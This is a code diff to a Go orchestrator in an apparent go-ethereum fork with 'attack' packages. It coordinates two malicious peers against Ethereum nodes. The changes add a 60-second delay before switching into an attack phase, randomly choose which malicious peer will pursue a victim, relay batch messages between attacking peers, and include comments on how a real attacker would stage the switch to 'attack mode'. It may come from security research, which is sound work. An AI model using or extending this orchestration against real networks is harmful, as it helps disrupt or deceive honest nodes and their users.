@@ -2,6 +2,8 @@ package orchestrator
 
 import "fmt"
 import "net"
+import "time"
+import "sync"
 import "encoding/binary"
 import "github.com/ethereum/go-ethereum/attack/buildchain"
 import "github.com/ethereum/go-ethereum/attack/msg"
@@ -25,6 +27,8 @@ type Orchestrator struct {
 	attackPhase utils.AttackPhase
 	chainBuilt bool
 	localMaliciousPeers bool
+	firstMasterSet bool
+	mu sync.Mutex
 }
 
 func New(errc chan error) *Orchestrator {
@@ -40,6 +44,7 @@ func New(errc chan error) *Orchestrator {
 		attackPhase: utils.StalePhase,
 		chainBuilt: false,
 		localMaliciousPeers: true,
+		firstMasterSet: false,
 	}
 
 	return o
@@ -103,7 +108,10 @@ func (o *Orchestrator) addPeers(port string) {
 
 		//peer.distributeChain(utils.PredictionChain)
 
-		go peer.readLoop(o.incoming, o.quitCh, o.errc)
+		go func() {
+			peer.readLoop(o.incoming, o.quitCh, o.errc)
+			o.peerset.remove(peerId)
+		}()
 		
 		err = o.initPeer(peer)
 		if err != nil {
@@ -119,16 +127,37 @@ func (o *Orchestrator) addPeers(port string) {
 			return
 		}
 
+		/*
+		Here, we arbitrarily choose to make the attack start after bootingTime seconds from when the two
+		malicious peers are ready. In other words, the attacker doesn't look for a victim in the first
+		bootingTime seconds. This simulates the fact that a real attacker has its Ethereum nodes in
+		standard operation and at some point he switches them to "attack mode".
+		When this happens, one of the two will stop accepting new peers from the network until a victim
+		is picked: this is another reason why we want to keep both nodes in "normal operation" at the
+		beginning, i.e. to establish some peering connections to other honest nodes.
+		*/
+		bootingTime := 60*time.Second
 		if o.peerset.len() >= 2 && o.attackPhase==utils.StalePhase && o.chainBuilt {
-			o.attackPhase = utils.ReadyPhase
-			err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
-			if err != nil {
-				fmt.Println("Could not notify start of the attack")
-				o.close()
-				o.errc <- err
-				return
-			}
-			go o.leadAttack()
+			go func() {
+				time.Sleep(bootingTime)
+				o.attackPhase = utils.ReadyPhase
+				err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
+				if err != nil {
+					fmt.Println("Could not notify start of the attack")
+					o.close()
+					o.errc <- err
+					return
+				}
+				randPeer := o.peerset.randGet()
+				err = o.sendAllExcept(msg.AvoidVictim.SetContent([]byte{1}), randPeer)
+				if err != nil {
+					fmt.Println("Could not set avoidVictim")
+					o.close()
+					o.errc <- err
+					return
+				}
+				o.leadAttack()
+			}()
 		}
 	}
 
@@ -225,6 +254,15 @@ func (o *Orchestrator) handleMessages() {
 						return
 					}
 				}()
+			case msg.ServeLastFullBatch.Code:
+				go func() {
+					err := o.sendAllExcept(message, sender)
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
 			}
 		}
 	}
@@ -246,6 +284,19 @@ func (o *Orchestrator) initPeer (p *Peer) error {
 	buf := make([]byte, 4)
 	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
 	err := o.send(p, msg.SetNumBatches.SetContent(buf))
+	if err != nil {
+			return err
+		}
+
+		/*
+	o.mu.Lock()
+	if o.firstMasterSet {
+		err = o.send(p, msg.AvoidVictim.SetContent([]byte{1}))
+	} else {
+		o.firstMasterSet = true
+	}
+	o.mu.Unlock()
+	*/
 	return err
 }
 
